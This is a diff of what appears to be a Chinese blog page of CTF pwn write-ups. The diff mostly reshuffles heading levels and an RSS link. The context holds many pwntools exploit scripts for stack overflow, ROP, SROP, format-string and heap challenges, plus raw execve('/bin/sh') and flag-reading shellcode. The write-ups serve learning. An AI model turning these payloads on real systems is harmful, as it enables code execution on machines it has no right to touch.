@@ -13,7 +13,8 @@
   <link rel="stylesheet" href="/vendor/highlight/github.min.css">
 
   <!-- RSS / Atom -->
-  <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+  
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="/zh/atom.xml">
 
   <script defer src="/vendor/highlight/highlight.min.js"></script>
 
@@ -70,8 +71,8 @@
 <p>接下来可能学内核、高版本的house系列，比赛的题解会单独开文章，并在对应的栏目添加文章链接。</p>
 </blockquote>
 <span id="more"></span>
-<h1>stack</h1>
-<h2 id="ctfshow-pwn-3-pwn03——ret2libc">ctfshow-pwn-3: pwn03——ret2libc</h2>
+<h2 id="stack">stack</h2>
+<h3 id="ctfshow-pwn-3-pwn03——ret2libc">ctfshow-pwn-3: pwn03——ret2libc</h3>
 <p>可以使用 <a target="_blank" rel="noopener" href="https://libc.blukat.me/">https://libc.blukat.me/</a> 查询libc库的各函数地址，再根据偏移计算其他函数的实际地址。</p>
 <p>也可以使用<a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a>自动化完成这一过程。</p>
 <p>exp（without LibcSearcher）：</p>
@@ -128,14 +129,14 @@ payload2=b'a'*13+p32(sys_add)+b'a'*4+p32(bin_sh)
 io.sendline(payload2)
 io.interactive()
 </code></pre>
-<h2 id="pwn1-sctf-2016">pwn1_sctf_2016</h2>
+<h3 id="pwn1-sctf-2016">pwn1_sctf_2016</h3>
 <p>c++乱入系列，那个<code>replace()</code>直接没看懂。</p>
 <p>而且自己的输入长度超过31就会被截断，完全无法栈溢出。</p>
 <p>后来看了题解才知道<code>replace()</code>是把你输入的<code>I</code>全部替换成<code>you</code>。</p>
 <p>再结合<code>vuln()</code>最后使用了危险的<code>strcpy()</code>函数，我一下子就知道怎么做了。</p>
 <p>因为输入点与retn的偏移是60，因此只需要输入20个<code>I</code>，再加上后门地址即可。</p>
 <p>看来以后碰到奇怪的字符串得输进去试试，说不定会有新发现。</p>
-<h2 id="ctfshow-pwn-4-pwn04——buffer-overflow-with-canary">ctfshow-pwn-4: pwn04——buffer overflow with canary</h2>
+<h3 id="ctfshow-pwn-4-pwn04——buffer-overflow-with-canary">ctfshow-pwn-4: pwn04——buffer overflow with canary</h3>
 <p>带canary的栈溢出，可以读入2次并输出buf串。</p>
 <p>通过IDA调试可知，canary的位置紧邻buf串且在它下游，因此不能直接覆盖到返回地址。</p>
 <p>但是canary的最高位始终是0，我们便有了如下办法：</p>
@@ -161,7 +162,7 @@ io.sendline(payload2)
 io.interactive()
 </code></pre>
 <p><s>原来这叫格式化字符串漏洞啊</s></p>
-<h2 id="ctfshow-pwn-6-pwn06——64bit-buffer-overflow">ctfshow-pwn-6: pwn06——64bit buffer overflow</h2>
+<h3 id="ctfshow-pwn-6-pwn06——64bit-buffer-overflow">ctfshow-pwn-6: pwn06——64bit buffer overflow</h3>
 <p>64位栈溢出与32位的一个不同点是必须保证堆栈平衡，因此需要return两次。</p>
 <p><s>但是在本地，我return一次就成功了。至今不知道原因</s></p>
 <pre><code class="language-python">from pwn import*
@@ -176,7 +177,7 @@ io.sendline(payload1)
 
 io.interactive()
 </code></pre>
-<h2 id="ctfshow-pwn-7-pwn07——64bit-ret2libc">ctfshow-pwn-7: pwn07——64bit ret2libc</h2>
+<h3 id="ctfshow-pwn-7-pwn07——64bit-ret2libc">ctfshow-pwn-7: pwn07——64bit ret2libc</h3>
 <p>64位的pwn3.</p>
 <p>由于<a target="_blank" rel="noopener" href="https://junyu33.github.io/2022/01/15/csapp.html#%E8%BF%87%E7%A8%8B">64位的传参方式</a>为“前6个是寄存器，之后使用栈”，退栈的时候要取出寄存器的值。因此需要找到<code>pop_rdi</code>和<code>pop_ret</code>的值，并插入到payload中。</p>
 <p>找<code>pop_rdi</code>和<code>pop_ret</code>指令地址的命令：</p>
@@ -223,7 +224,7 @@ io.sendline(payload2)
 io.interactive()
 </code></pre>
 <p><s>然而神奇的是这个代码本地又不行了</s></p>
-<h2 id="ciscn-2019-c-1">ciscn_2019_c_1</h2>
+<h3 id="ciscn-2019-c-1">ciscn_2019_c_1</h3>
 <p>带加密的pwn07.（经过测试发现，其实不对输入做处理也可以getshell）</p>
 <p>获取got表地址的exp：</p>
 <pre><code class="language-python">io.recvuntil('!\n')
@@ -241,14 +242,14 @@ str_first = io.recv(6).ljust(8,b'\x00')
 <blockquote>
 <p>为什么pop_rdi的地址还在那个位置，而且长度还变短了？</p>
 </blockquote>
-<h2 id="xctf-pwn-beginner-7-cgpwn2——ret2libc-with-system">xctf-pwn-(beginner)-7: cgpwn2——ret2libc with system</h2>
+<h3 id="xctf-pwn-beginner-7-cgpwn2——ret2libc-with-system">xctf-pwn-(beginner)-7: cgpwn2——ret2libc with system</h3>
 <p>带system，不带<code>'/bin/sh'</code>的ret2libc，关键部分如下：</p>
 <pre><code class="language-python">payload = b'a'*42 + p32(gets_plt) + p32(pop_ebx) + p32(buf2) + p32(system_plt) + p32(0xdeadbeef) + p32(buf2)
 io.sendline(payload)
 io.sendline('cat flag')
 </code></pre>
 <p><strong>原理有空再补。</strong></p>
-<h2 id="xctf-pwn-beginner-8-level3——re2libc-without-puts">xctf-pwn-(beginner)-8: level3——re2libc without puts</h2>
+<h3 id="xctf-pwn-beginner-8-level3——re2libc-without-puts">xctf-pwn-(beginner)-8: level3——re2libc without puts</h3>
 <p>依旧是ret2libc，只不过没有<code>puts</code>函数，泄露libc地址的payload需要变化一下：</p>
 <img src="https://img.junyu33.me/blog/bin_ctf/write.png">
 <pre><code class="language-python">payload = flat([b'A' * 140, write_plt, main, 1, write_got, 4]) # the last three are arguments of &quot;write&quot;
@@ -263,14 +264,14 @@ binsh_addr = libcbase + 'bin_sh_addr' # we can't use 'symbols' to get address, w
 <p>那么<code>'bin/sh'</code>怎么办呢，使用这个bash：</p>
 <pre><code class="language-sh">strings -a -t x libc_32.so.6 | grep &quot;bin/sh&quot; 
 </code></pre>
-<h3 id="如何在本地打通libc——3-18-2022">如何在本地打通libc——3/18/2022</h3>
+<h4 id="如何在本地打通libc——3-18-2022">如何在本地打通libc——3/18/2022</h4>
 <pre><code class="language-sh">ls -l /lib/x86_64-linux-gnu/libc.so.6 # find your local libc, it's &quot;libc-2.27.so&quot; in wsl ubuntu 18.04.
 # make sure to change your &quot;import&quot; and your &quot;strings &amp; grep&quot; commands. 
 </code></pre>
 <blockquote>
 <p>获得成就：xctf-pwn新手区完结撒花！</p>
 </blockquote>
-<h2 id="get-started-3dsctf-2016——rop1">get_started_3dsctf_2016——rop1</h2>
+<h3 id="get-started-3dsctf-2016——rop1">get_started_3dsctf_2016——rop1</h3>
 <p>32bit。</p>
 <p>程序给了一个读取flag的后门，但需要你传入正确的两个参数。</p>
 <p>学会了gdb调试，回忆起来了return addr和函数参数之前隔了一个返回地址。函数参数是正序书写的。</p>
@@ -297,7 +298,7 @@ print(io.recv())
 #io.interactive()
 
 </code></pre>
-<h2 id="not-the-same-3dsctf-2016——rop2">not_the_same_3dsctf_2016——rop2</h2>
+<h3 id="not-the-same-3dsctf-2016——rop2">not_the_same_3dsctf_2016——rop2</h3>
 <blockquote>
 <p>这里有个函数，已经将flag的值读取并输入到了fl4g的位置，所以我们先用这个函数填充到返回地址处，把flag先读取到fl4g为起始地址的内存中，接下来试着把这里的内容泄露出来，即可获取flag。所以我们需要write函数，并且因为write函数有三个参数， <s>所以还需要pop三个寄存器的指令进行清理栈，最后的p32(0)是pop中含着的ret操作，所以还需要再加一个返回地址，因为我们已经输出了flag，所以返回地址并不需要在意是哪，随便都可。</s> 具体exp如下：</p>
 <p>版权声明：本文为CSDN博主「ShouCheng3」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
@@ -325,7 +326,7 @@ io.sendline(payload)
 print(io.recv())
 io.interactive()
 </code></pre>
-<h2 id="HarekazeCTF2019-baby-rop2——rop3">[HarekazeCTF2019]baby_rop2——rop3</h2>
+<h3 id="HarekazeCTF2019-baby-rop2——rop3">[HarekazeCTF2019]baby_rop2——rop3</h3>
 <pre><code class="language-python">#rop
 #printf(&quot;your input is %s!&quot;, buf);
 payload1 = b'a'*(0x20+8) + p64(pop_rdi) + p64(fmt_addr) #1st argument of printf -&gt; rdi
@@ -335,7 +336,7 @@ payload1 += p64(printf_plt) + p64(main_addr) #call printf_plt to output the got 
 payload2 = b'a'*(0x20+8) + p64(pop_rdi) + p64(bin_sh)+ p64(sys_addr)
 </code></pre>
 <p>这里第二行使用<code>read_got</code>而不使用<code>printf_got</code>的原因是<code>printf</code>不支持末尾零截断。</p>
-<h2 id="ciscn-2019-es-2——stack-migration1">ciscn_2019_es_2——stack migration1</h2>
+<h3 id="ciscn-2019-es-2——stack-migration1">ciscn_2019_es_2——stack migration1</h3>
 <p>适用于payload长度较短的情况，将rop写在栈中，通过修改ebp的值劫持程序执行流到构造的rop附近，从而执行自己的rop。</p>
 <p>此题read长度限制为<code>sizeof(buf)+8</code>，故不能直接使用之前的<code>retlibc3</code></p>
 <p>缓冲区变量与上层函数的ebp通过动调得到：</p>
@@ -373,11 +374,11 @@ if __name__ == &quot;__main__&quot;:
    
    io.interactive()
 </code></pre>
-<h2 id="ciscn-2019-s-3——ret2csu">ciscn_2019_s_3——ret2csu</h2>
+<h3 id="ciscn-2019-s-3——ret2csu">ciscn_2019_s_3——ret2csu</h3>
 <p>本题的要点是执行<code>execve('/bin/sh',0,0)</code>这个函数，调用这个函数需要有<code>syscall</code>指令，并且需要满足<code>rax = 0x3b, rdi = &lt;bin_sh_addr&gt;, rsi = rdx = 0</code>这几个条件。</p>
 <p>可以从<code>ROPgadget</code>中得到<code>pop rdi</code>与<code>pop rsi</code>这几个gadget从而成功传参，<code>mov rax，3bh</code>也可以从<code>gadgets</code>函数附近得到。但是并没有任何直接的退栈指令涉及到<code>rdx</code>寄存器，而且程序中没有<code>/bin/sh</code>字符串，需要自行插入且找到它在栈中的地址。</p>
 <p>通过在IDA中寻找<code>rdx</code>字符串，可以找到唯一可能改变<code>rdx</code>值的指令在<code>__libc_csu_init</code>中，以下是其反汇编代码（后半部分）：</p>
-<h3 id="libc-csu-init-source">__libc_csu_init source</h3>
+<h4 id="libc-csu-init-source">__libc_csu_init source</h4>
 <pre><code class="language-assembly">.text:0000000000400580                                   loc_400580:                   ; CODE XREF: __libc_csu_init+54↓j
 .text:0000000000400580 038 4C 89 EA                      mov     rdx, r13
 .text:0000000000400583 038 4C 89 F6                      mov     rsi, r14
@@ -438,7 +439,7 @@ def exploit():
 
    io.send(payload1)
 </code></pre>
-<h2 id="Black-Watch-入群题-PWN-1——stack-migration2">[Black Watch 入群题]PWN 1——stack migration2</h2>
+<h3 id="Black-Watch-入群题-PWN-1——stack-migration2">[Black Watch 入群题]PWN 1——stack migration2</h3>
 <p><s>这年头入群都那么难了</s></p>
 <p>栈迁移需要将你的rop写到一个固定的段中（比如bss段），然后通过修改ebp的值达到栈转移的目的。适用于缓冲区溢出长度较短的情况。</p>
 <pre><code class="language-python">payload1 = p32(fake_ebp) + p32(write_plt) + p32(vuln) + p32(1) + p32(write_got) + p32(4)
@@ -446,9 +447,9 @@ def exploit():
 payload2 = b'a'*(24) + p32(bss) + p32(leave_ret)
 # stack overflow in vuln function, aware that leave command makes ebp increase 4 bytes
 </code></pre>
-<h2 id="cmcc-simplerop——statically-linked-rop">cmcc_simplerop——statically_linked rop</h2>
+<h3 id="cmcc-simplerop——statically-linked-rop">cmcc_simplerop——statically_linked rop</h3>
 <p>静态链接查看方式：file命令。</p>
-<h3 id="method-1——manual-rop">method 1——manual rop</h3>
+<h4 id="method-1——manual-rop">method 1——manual rop</h4>
 <p>这个rop将read函数交给用户来输入，属于先前未见过的类型，比较巧妙。</p>
 <pre><code class="language-python">def exploit():
    read = 0x806cd50
@@ -463,7 +464,7 @@ payload2 = b'a'*(24) + p32(bss) + p32(leave_ret)
    io.sendline(payload)
    io.sendline(b'/bin/sh\0')
 </code></pre>
-<h3 id="method-2——ropper-execve">method 2——ropper execve</h3>
+<h4 id="method-2——ropper-execve">method 2——ropper execve</h4>
 <pre><code class="language-sh">ropper -f &lt;file&gt; --chain execve
 </code></pre>
 <p><strong>注意生成的语法是py2语法，需要手动将str改成bytes</strong></p>
@@ -536,7 +537,7 @@ payload2 = b'a'*(24) + p32(bss) + p32(leave_ret)
    io.sendline(rop)
 </code></pre>
 <p>长度刚好100，可以通过。</p>
-<h3 id="method-3——mprotect-shellcode">method 3——mprotect+shellcode</h3>
+<h4 id="method-3——mprotect-shellcode">method 3——mprotect+shellcode</h4>
 <p><code>int mprotect(const void *start, size_t len, int prot);</code></p>
 <blockquote>
 <p>第一个是开辟的地址起始位置，需要和内存页对齐，也就是能被0x1000整除；第二参数也需要是内存页的整数倍；第三个是开辟的内存属性，1代表可读，2代表可写，4代表可执行，7代表可读可写可执行。</p>
@@ -556,13 +557,13 @@ payload2 = b'a'*(24) + p32(bss) + p32(leave_ret)
    io.sendline(payload)
    io.sendline(shellcode)
 </code></pre>
-<h2 id="wustctf2020-getshell-2——system-call">wustctf2020_getshell_2——system call</h2>
+<h3 id="wustctf2020-getshell-2——system-call">wustctf2020_getshell_2——system call</h3>
 <p>本来以为需要搞栈迁移，结果一个<code>system call</code>就搞好了，节省了4字节的空间。</p>
 <pre><code class="language-python">system_call = 0x8048529
 sh = 0x8048670
 payload = 'a'*28 + p32(system_call)+p32(sh)
 </code></pre>
-<h2 id="pwnable-start">pwnable_start</h2>
+<h3 id="pwnable-start">pwnable_start</h3>
 <p>长度23字节的shellcode：<code>b'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80'</code></p>
 <p>或者20字节的<code>b'\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'</code></p>
 <p>ret2shellcode，调用write函数泄露栈地址。</p>
@@ -578,7 +579,7 @@ payload = 'a'*28 + p32(system_call)+p32(sh)
    payload = b'a'*20 + p32(buf+0x14) + shellcode
    io.sendline(payload)
 </code></pre>
-<h2 id="nepctf2022-nyancat——syscall">nepctf2022: nyancat——syscall</h2>
+<h3 id="nepctf2022-nyancat——syscall">nepctf2022: nyancat——syscall</h3>
 <p>由于开启了NX保护,从而不能直接写shellcode.</p>
 <pre><code class="language-python">def exploit():
    payload1 = b'a'*16 + p32(0x80480f0) + p32(0x8048115) 
@@ -590,7 +591,7 @@ payload = 'a'*28 + p32(system_call)+p32(sh)
    payload2 = b'/bin/sh'.ljust(0xb, b'\0') # the length of the input (eax) is 0xb, time to getshell
    io.send(payload2)
 </code></pre>
-<h2 id="gyctf-2020-borrowstack——stack-migration3">gyctf_2020_borrowstack——stack migration3</h2>
+<h3 id="gyctf-2020-borrowstack——stack-migration3">gyctf_2020_borrowstack——stack migration3</h3>
 <p>对于多次栈迁移的情况，要先写好下次的bss段，作为ebp/rbp。</p>
 <pre><code class="language-python">def exploit():
    puts_got = elf.got['puts']
@@ -608,7 +609,7 @@ payload = 'a'*28 + p32(system_call)+p32(sh)
    payload3 = b'\0'*0x60 + p64(0) + p64(one_gadget)
    p.send(payload3)
 </code></pre>
-<h2 id="qwb2022-devnull——stack-migration-rop">qwb2022_devnull——stack migration+rop</h2>
+<h3 id="qwb2022-devnull——stack-migration-rop">qwb2022_devnull——stack migration+rop</h3>
 <p>64位shellcode:<code>b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'</code></p>
 <p>第一次栈溢出（off by one）通过将fd改为0实现输入。</p>
 <p>第二次栈溢出修改buf指针与rbp，并进行栈迁移。</p>
@@ -630,7 +631,7 @@ def exploit():
    payload3 += p64(0xdeadbeef) + p64(cross+0x28) + shellcode
    p.send(payload3)
 </code></pre>
-<h2 id="jarvisoj-level5——ret2csu2">jarvisoj_level5——ret2csu2</h2>
+<h3 id="jarvisoj-level5——ret2csu2">jarvisoj_level5——ret2csu2</h3>
 <p>用了修改寄存器的通用模板。</p>
 <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#ret2csu">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#ret2csu</a></p>
 <pre><code class="language-python">csu_front_addr = 0x400690
@@ -666,7 +667,7 @@ def exploit():
    payload2 = b'a'*0x88 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
    p.sendline(payload2)
 </code></pre>
-<h2 id="cmcc-pwnme2">cmcc_pwnme2</h2>
+<h3 id="cmcc-pwnme2">cmcc_pwnme2</h3>
 <p>注意观察<code>exec_string</code>函数：</p>
 <pre><code class="language-c">int exec_string()
 &#123;
@@ -688,7 +689,7 @@ def exploit():
    io.sendline(payload)
    io.sendline('/flag')
 </code></pre>
-<h2 id="spqr——stack-off-by-null">spqr——stack off by null</h2>
+<h3 id="spqr——stack-off-by-null">spqr——stack off by null</h3>
 <p>除了aslr保护全关，vuln函数是一个长度为16的buf与<code>scanf(&quot;%16s&quot;, buf)</code>.</p>
 <p>可以通过off by null将rbp末位置0，如果刚好是buf，那么可以通过<code>ret</code>写asm。进而通过asm调用<code>sys_read</code>，写入shellcode再<code>jmp</code>进去。</p>
 <p>由于编译器与系统差异，本地无法构造长度小于8的shellcode，本地未通过。</p>
@@ -708,7 +709,7 @@ def exploit():
    io.sendline(payload)
    io.sendline(shellcode2)
 </code></pre>
-<h2 id="极客大挑战-not-bad——orw-stack-migration">极客大挑战_not bad——orw+stack migration</h2>
+<h3 id="极客大挑战-not-bad——orw-stack-migration">极客大挑战_not bad——orw+stack migration</h3>
 <p>orw通用读flag代码:</p>
 <pre><code class="language-python">shellcode = shellcraft.open('/flag')
 shellcode += shellcraft.read('rax','rsp',100)
@@ -743,7 +744,7 @@ def exploit():
    payload = asm(shellcode)
    io.send(payload)
 </code></pre>
-<h2 id="qwb2019-babymimic">qwb2019_babymimic</h2>
+<h3 id="qwb2019-babymimic">qwb2019_babymimic</h3>
 <p>一道拟态的rop。程序给了一个32位一个64位的文件，执行的功能完全一致，唯一的不同之处就是栈的大小。</p>
 <p>由于是静态编译，可以使用ropper直接写ropchain。</p>
 <p>至于payload的构造可以参考这个：</p>
@@ -763,7 +764,7 @@ def exploit():
    payload = b'a'*0x110+p32(ret_10c)+p32(pop_eax_ret)+rop64.ljust(0x10c, b'\0')+rop[4:] 
    io.send(payload)
 </code></pre>
-<h2 id="rootersctf-2019-srop">rootersctf_2019_srop</h2>
+<h3 id="rootersctf-2019-srop">rootersctf_2019_srop</h3>
 <p>执行<code>sigreturn</code>的条件只有<code>rax == 15</code>且执行<code>syscall</code>.</p>
 <p>可以通过pwntools集成了<code>SigreturnFrame()</code>来修改指定的寄存器.</p>
 <p>本题先通过<code>syscall</code>后的<code>leave; ret</code>抬栈，把buf设置在固定位置，在下一次输入时直接将<code>'/bin/sh\0'</code>写入指定位置，然后使用<code>sys_execve</code>调用。</p>
@@ -794,7 +795,7 @@ def exploit():
    payload = payload.ljust(0x200, b'\0') + b'/bin/sh\x00'
    io.send(payload)
 </code></pre>
-<h2 id="360chunqiu2017-smallest——leak-stack-srop">360chunqiu2017_smallest——leak stack+srop</h2>
+<h3 id="360chunqiu2017-smallest——leak-stack-srop">360chunqiu2017_smallest——leak stack+srop</h3>
 <p>我们不仅可以通过sys_read控制返回值，进而控制rdi。也可以通过sys_write泄露rsp/rbp，从而泄露栈地址。</p>
 <p>由 <a target="_blank" rel="noopener" href="https://hackeradam.com/x86-64-linux-syscalls/">https://hackeradam.com/x86-64-linux-syscalls/</a> 可以得出，write对应的调用号为1，而stdout的文件描述符也是1，因此可行。</p>
 <p>泄露栈地址后有一下几种做法（后两者来自于 <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-258047-1.htm">https://bbs.pediy.com/thread-258047-1.htm</a> ）：</p>
@@ -821,8 +822,8 @@ def exploit():
    io.send(p64(0x4000b0)+p64(0x4000be)+bytes(frame)+b'/bin/sh\0'*95)
    io.send(p64(0x4000be)+bytes(frame)[:7]) # rax=15, sys_rt_sigreturn
 </code></pre>
-<h1>fmtstr</h1>
-<h2 id="xctf-pwn-beginner-4-string">xctf-pwn-(beginner)-4: string</h2>
+<h2 id="fmtstr">fmtstr</h2>
+<h3 id="xctf-pwn-beginner-4-string">xctf-pwn-(beginner)-4: string</h3>
 <p>格式化字符串。<s>逐渐变得不是那么面向萌新了</s></p>
 <p>对于格式不规范的printf函数，有以下利用方式：</p>
 <blockquote>
@@ -840,7 +841,7 @@ def exploit():
 <p>然后是输入spell的部分，<code>mmap</code>是一个内存映射函数，内容可执行，直接上一句话shell。</p>
 <pre><code class="language-python">io.sendline(asm(shellcraft.sh()))
 </code></pre>
-<h3 id="另解">另解</h3>
+<h4 id="另解">另解</h4>
 <p>通过ida调试后发现main函数中的secret地址，与非规范的printf离得并不远，不超过100h。</p>
 <p>如果你有足够耐心，会发现输入25个%p后对应的恰好就是secret的地址，而且这个值跟之前的7一样，不会变动。<s>所以之前那个输入地址的scanf是完全不需要的。</s></p>
 <p>exp:</p>
@@ -869,7 +870,7 @@ io.sendline(asm(shellcraft.sh()))
 
 io.interactive()
 </code></pre>
-<h2 id="第五空间决赛pwn5——fmtstr">第五空间决赛pwn5——fmtstr</h2>
+<h3 id="第五空间决赛pwn5——fmtstr">第五空间决赛pwn5——fmtstr</h3>
 <p>pwntools工具：fmtstr用于格式化字符串漏洞。</p>
 <p><code>fmtstr_payload(offset,&#123;address1:value1&#125;)</code></p>
 <p>如何计算偏移，例如：</p>
@@ -893,7 +894,7 @@ io.sendline('123456')
 io.interactive()
 </code></pre>
 <p>不使用工具的exp <s>（然而我并不理解其中的含义）</s>:</p>
-<h3 id="updated-on-2-25">updated on 2/25</h3>
+<h4 id="updated-on-2-25">updated on 2/25</h4>
 <p><code>$n</code>代表已经先前成功输出的字节数，在这儿是四个int，也就是<code>0x10</code>.</p>
 <p>而之前我们算出到输入的偏移是10，因此就从%10开始，把<code>0x804c044</code>~<code>0x804c047</code>的地址全部复制为<code>0x10</code>.</p>
 <p>因此我们最后输入<code>10101010</code>即可满足条件。</p>
@@ -908,7 +909,7 @@ io.sendline(payload)
 io.sendline(str(0x10101010))
 io.interactive()
 </code></pre>
-<h2 id="ctfshow-pwn-10-dota——int-overflow-fmtstr-ret2libc">ctfshow-pwn-10: dota——int overflow+fmtstr+ret2libc</h2>
+<h3 id="ctfshow-pwn-10-dota——int-overflow-fmtstr-ret2libc">ctfshow-pwn-10: dota——int overflow+fmtstr+ret2libc</h3>
 <p>前两个问题很简单，<code>-2147483648</code>相反数为本身这个是我才从csapp学到的。</p>
 <p>然后是格式化字符串，<code>fmtstr_payload</code>报错，说只能在32bit范围内运行，没办法只能手动构造。</p>
 <p>经过手动输出栈地址可知偏移为8.</p>
@@ -960,7 +961,7 @@ io.sendline(payload2)
 io.interactive()
 
 </code></pre>
-<h2 id="fmtstr-ret2libc">fmtstr+ret2libc</h2>
+<h3 id="fmtstr-ret2libc">fmtstr+ret2libc</h3>
 <p>给出了源码：</p>
 <pre><code class="language-c">#include&lt;stdio.h&gt;
 
@@ -1001,7 +1002,7 @@ io.sendline(payload)
 io.interactive()
 
 </code></pre>
-<h2 id="bjdctf-2020-babyrop2——ret2libc-fmtstr-canary">bjdctf_2020_babyrop2——ret2libc+fmtstr+canary</h2>
+<h3 id="bjdctf-2020-babyrop2——ret2libc-fmtstr-canary">bjdctf_2020_babyrop2——ret2libc+fmtstr+canary</h3>
 <p>算是栈溢出系列的一个小综合吧，利用格式化字符串泄露canary值，然后进行常规rop和64位的ret2libc，总体来说难度不大。（主要是想要贴一下自己现在的代码框架，个人感觉还不错）</p>
 <pre><code class="language-python">from pwn import *
 import sys
@@ -1052,7 +1053,7 @@ if __name__ == &quot;__main__&quot;:
 
    io.interactive()
 </code></pre>
-<h2 id="axb-2019-fmt32">axb_2019_fmt32</h2>
+<h3 id="axb-2019-fmt32">axb_2019_fmt32</h3>
 <p>栈未对齐的格式化字符串+ret2libc，加上一个字符偏移为8.</p>
 <pre><code class="language-python">def exploit():
    io.recvuntil('tell me:')
@@ -1070,7 +1071,7 @@ if __name__ == &quot;__main__&quot;:
    payload3 = b';/bin/sh\0' # finish the last command and getshell
    io.sendline(payload3)
 </code></pre>
-<h2 id="buu-n1book-fsb2——fmtstr-on-heap">buu-n1book: fsb2——fmtstr on heap</h2>
+<h3 id="buu-n1book-fsb2——fmtstr-on-heap">buu-n1book: fsb2——fmtstr on heap</h3>
 <p>堆上的格式化字符串，学习链接：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184717">https://www.anquanke.com/post/id/184717</a></p>
 <p>这里的任意地址写的脚本适配了64位的情况。</p>
 <p>通常在64位中，<code>elf_base</code>以0x55开头，而<code>libc_base</code>以0x7f开头，最后12位均为0.</p>
@@ -1111,7 +1112,7 @@ def exploit():
 <p>update on 2022/10/2:</p>
 <p>原博客上的代码有一些瑕疵，第9行应该修改为<code>p.sendline(&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;.format((target_addr&amp;0xff)+256,off1))</code>，否则不能将一个字节修改为<code>00</code>.（此处已修改）</p>
 </blockquote>
-<h2 id="axb-2019-fmt64">axb_2019_fmt64</h2>
+<h3 id="axb-2019-fmt64">axb_2019_fmt64</h3>
 <p>python3的类型转换有点让人头疼......</p>
 <pre><code class="language-python">def exploit():
    io.recvuntil('tell me:')
@@ -1137,7 +1138,7 @@ def exploit():
    payload3 = b';/bin/sh\0'
    io.sendafter('tell me:', payload3)
 </code></pre>
-<h2 id="ciscn-2019-sw-1——fini-array">ciscn_2019_sw_1——fini.array</h2>
+<h3 id="ciscn-2019-sw-1——fini-array">ciscn_2019_sw_1——fini.array</h3>
 <blockquote>
 <p><code>main</code>函数只有一次格式化字符串的机会，并且杜绝了栈溢出。</p>
 </blockquote>
@@ -1167,7 +1168,7 @@ def exploit():
    io.sendline(payload)
    io.sendline('/bin/sh\0')
 </code></pre>
-<h2 id="pwnable-fsb-buu-enhanced">pwnable_fsb(buu enhanced)</h2>
+<h3 id="pwnable-fsb-buu-enhanced">pwnable_fsb(buu enhanced)</h3>
 <p>原题pwnable是32位没有开pie，而buu上的版本是64位开了pie，导致难度有所增加。</p>
 <p>写1位用<code>$hhn</code>，写2位用<code>$hn</code> ，写4位用<code>$n</code>，写8位用<code>$ln</code>.</p>
 <p>首先第一次格式化字符串记录<code>elf_base</code>，<code>stack_base</code>和<code>[rbp]</code>.</p>
@@ -1241,7 +1242,7 @@ if __name__ == '__main__':
    io.interactive()
    io.close()
 </code></pre>
-<h2 id="wustctf2020-babyfmt——partial-stderr">wustctf2020_babyfmt——partial_stderr</h2>
+<h3 id="wustctf2020-babyfmt——partial-stderr">wustctf2020_babyfmt——partial_stderr</h3>
 <p>这题思路比较清奇，虽然有<a target="_blank" rel="noopener" href="https://blog.csdn.net/Invin_cible/article/details/124003843">Loτυs</a>改<code>fmt_attack</code>计数器的非预期。</p>
 <p>格式化字符串一次，允许任意地址泄露一字节一次，最开始还可以<code>scanf(&quot;%ld&quot;)</code>输入一次时间。</p>
 <p>当你输入的不是整数时scanf拒绝输入，并返回了三个栈地址，其中一个与elf基址有关。</p>
@@ -1269,9 +1270,9 @@ if __name__ == '__main__':
 
    getflag('\0'*64)
 </code></pre>
-<h1>heap</h1>
-<h2 id="libc-2-23">libc 2.23</h2>
-<h3 id="libc-2-23-uaf">libc 2.23 uaf</h3>
+<h2 id="heap">heap</h2>
+<h3 id="libc-2-23">libc 2.23</h3>
+<h4 id="libc-2-23-uaf">libc 2.23 uaf</h4>
 <img src='https://img.junyu33.me/blog/bin_ctf/heap1.png'>
 <img src='https://img.junyu33.me/blog/bin_ctf/heap2.png'>
 <p>one_gadget使用：</p>
@@ -1295,7 +1296,7 @@ if __name__ == '__main__':
    add(2, 0x60, b'2'*0x13 + p64(one_gadget))
    add(4, 0x60, '4')
 </code></pre>
-<h3 id="babyheap-0ctf-2017——fastbin-attack">babyheap_0ctf_2017——fastbin attack</h3>
+<h4 id="babyheap-0ctf-2017——fastbin-attack">babyheap_0ctf_2017——fastbin attack</h4>
 <blockquote>
 <p>在<code>ubuntu18/libc2.26</code>及以上版本本地无法打通，无法gdb调试，堆栈图就不贴了。</p>
 <p>原因：<code>libc2.26</code>引入了<code>tcache</code>机制。</p>
@@ -1329,7 +1330,7 @@ if __name__ == '__main__':
     alloc(0x18)
     p.interactive()
 </code></pre>
-<h3 id="ZJCTF-2019-EasyHeap——fastbin-double-free">[ZJCTF 2019]EasyHeap——fastbin double free</h3>
+<h4 id="ZJCTF-2019-EasyHeap——fastbin-double-free">[ZJCTF 2019]EasyHeap——fastbin double free</h4>
 <p>相比0ctf2017的堆题简单一点，不需要泄露<code>__malloc_hook</code>函数。</p>
 <pre><code class="language-python">def exploit():
    Alloc(0x18, '0')
@@ -1351,7 +1352,7 @@ if __name__ == '__main__':
 
    io.sendline('4869')
 </code></pre>
-<h3 id="babyfengshui-33c3-2016">babyfengshui_33c3_2016</h3>
+<h4 id="babyfengshui-33c3-2016">babyfengshui_33c3_2016</h4>
 <p><code>partial RELRO</code>，可以修改got表和plt表。</p>
 <p>程序去除超时限制——用isnan函数替换alarm函数。</p>
 <pre><code class="language-bash">sed -i s/alarm/isnan/g ./ProgrammName
@@ -1380,7 +1381,7 @@ if __name__ == '__main__':
     
    Del(2)
 </code></pre>
-<h3 id="hitcontraining-heapcreator——off-by-one-chunk-overlapping">hitcontraining_heapcreator——off by one+chunk overlapping</h3>
